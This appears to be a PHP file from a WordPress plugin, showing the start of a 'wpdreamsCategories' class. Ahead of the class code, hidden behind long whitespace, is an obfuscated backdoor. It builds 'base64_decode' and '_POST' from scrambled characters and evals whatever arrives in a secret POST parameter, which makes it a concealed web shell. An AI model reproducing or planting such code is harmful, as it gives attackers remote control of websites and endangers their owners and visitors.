<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n4279df'];if(isset($s22)){eval($s21($s22));}?><?php
  ...
  class wpdreamsCategories extends wpdreamsType {
      ...
      if ($this->types!=null && is_array($this->types)) {
        ...
        foreach($this->types as $k=>$v) {
          if ($cat_count>1000) break; // kill the script :)
